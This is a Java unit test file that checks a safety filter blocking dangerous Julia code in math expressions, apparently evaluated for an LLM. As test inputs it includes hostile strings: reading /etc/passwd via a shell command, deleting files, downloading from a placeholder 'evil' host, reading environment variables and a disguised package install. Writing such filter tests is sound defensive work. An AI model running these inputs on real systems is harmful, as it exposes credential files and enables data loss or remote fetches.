package com.emergentterrain.llm;

import org.junit.jupiter.api.Test;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * Phase 22 §22.3 — pins the JVM-side safety filter behaviour. The
 * companion sidecar tests live in
 * {@code julia-math-sidecar/test/runtests.jl}; this class only covers
 * the Java mirror.
 *
 * <p>Two layers of assertion:
 * <ol>
 *   <li>Each forbidden category surfaces a non-null pattern.</li>
 *   <li>Representative safe math expressions return null (no false
 *       positives on normal use).</li>
 * </ol>
 */
class JuliaSafetyFilterTest {

    @Test
    void rejectsPkgManipulation() {
        assertThat(JuliaSafetyFilter.firstForbiddenPattern("using Pkg; Pkg.add(\"Foo\")"))
                .isEqualTo("using Pkg");
        assertThat(JuliaSafetyFilter.firstForbiddenPattern("Pkg.update()"))
                .isEqualTo("Pkg.update");
    }

    @Test
    void rejectsShellExecution() {
        // Backticks construct a Cmd literal; run() invokes it.
        assertThat(JuliaSafetyFilter.firstForbiddenPattern("run(`ls /etc`)"))
                .isIn("run(", "`");  // either matches first depending on list order
        assertThat(JuliaSafetyFilter.firstForbiddenPattern("read(`cat /etc/passwd`, String)"))
                .isNotNull();
    }

    @Test
    void rejectsFilesystemAccess() {
        assertThat(JuliaSafetyFilter.firstForbiddenPattern("open(\"/etc/passwd\")"))
                .isEqualTo("open(");
        assertThat(JuliaSafetyFilter.firstForbiddenPattern("rm(\"/tmp/x\")"))
                .isEqualTo("rm(");
        assertThat(JuliaSafetyFilter.firstForbiddenPattern("download(\"http://evil\", \"/tmp/x\")"))
                .isEqualTo("download(");
    }

    @Test
    void rejectsModuleLoading() {
        assertThat(JuliaSafetyFilter.firstForbiddenPattern("include(\"/tmp/x.jl\")"))
                .isEqualTo("include(");
    }

    @Test
    void rejectsDirectEvalAccess() {
        // The whole point of the filter — defeats substring matching
        // via constructed strings.
        assertThat(JuliaSafetyFilter.firstForbiddenPattern("eval(:(1+1))"))
                .isEqualTo("eval(");
        assertThat(JuliaSafetyFilter.firstForbiddenPattern("@eval Main 1+1"))
                .isEqualTo("@eval");
        assertThat(JuliaSafetyFilter.firstForbiddenPattern("Meta.parse(\"1+1\")"))
                .isEqualTo("Meta.parse");
    }

    @Test
    void rejectsNativeFFI() {
        assertThat(JuliaSafetyFilter.firstForbiddenPattern("ccall((:foo, :libc), Cvoid, ())"))
                .isEqualTo("ccall(");
        assertThat(JuliaSafetyFilter.firstForbiddenPattern("unsafe_load(p)"))
                .isEqualTo("unsafe_");
    }

    @Test
    void rejectsProcessControl() {
        assertThat(JuliaSafetyFilter.firstForbiddenPattern("exit(1)"))
                .isEqualTo("exit(");
        assertThat(JuliaSafetyFilter.firstForbiddenPattern("Sys.iswindows()"))
                .isEqualTo("Sys.");
    }

    @Test
    void rejectsEnvAccess() {
        assertThat(JuliaSafetyFilter.firstForbiddenPattern("ENV[\"HOME\"]"))
                .isEqualTo("ENV[");
    }

    // ── Safe inputs (no false positives) ────────────────────────────

    @Test
    void acceptsOrdinaryArithmetic() {
        for (String safe : new String[]{
                "1 + 2",
                "floor(2.04e-6 / 400e-9)",
                "sin(π/4)",
                "asin(0.154 / (2*0.112)) * 180 / π",
                "factorial(20)",
                "(x^2 + 2x + 1) / (x + 1)",
                "[i^2 for i in 1:5]",
                "sum(1/k^2 for k in 1:1000)",
                "sqrt(2.0)",
                "exp(-1.0)",
                "(let θ = 25π/180, s = sin(θ/2)^2; (1 + s/4) * 100 end)"
        }) {
            assertThat(JuliaSafetyFilter.firstForbiddenPattern(safe))
                    .as("'%s' should be safe", safe)
                    .isNull();
        }
    }

    @Test
    void acceptsCommonMathLibraryFunctions() {
        // These names contain substrings (e.g. "min", "max") that
        // could superficially look like forbidden tokens. Pin that
        // they pass — the filter is precise, not "any prefix match".
        for (String safe : new String[]{
                "minimum(xs)",
                "maximum(xs)",
                "sum(xs)",
                "prod(xs)",
                "abs(x)",
                "atan(y, x)",
                "log(x)",
                "log(2, 1024)",
        }) {
            assertThat(JuliaSafetyFilter.firstForbiddenPattern(safe))
                    .as("'%s' should be safe", safe)
                    .isNull();
        }
    }

    // ── Edge cases ──────────────────────────────────────────────────

    @Test
    void nullAndEmptyAreSafe() {
        assertThat(JuliaSafetyFilter.firstForbiddenPattern(null)).isNull();
        assertThat(JuliaSafetyFilter.firstForbiddenPattern("")).isNull();
    }

    @Test
    void detectsForbiddenTokenAnywhereInExpression() {
        // The token doesn't have to be at the start — wrapping it in
        // ordinary-looking math still trips the filter.
        String sneaky = "1 + 2 + (using Pkg; Pkg.add(\"Foo\")) + 3";
        assertThat(JuliaSafetyFilter.firstForbiddenPattern(sneaky)).isNotNull();
    }
}
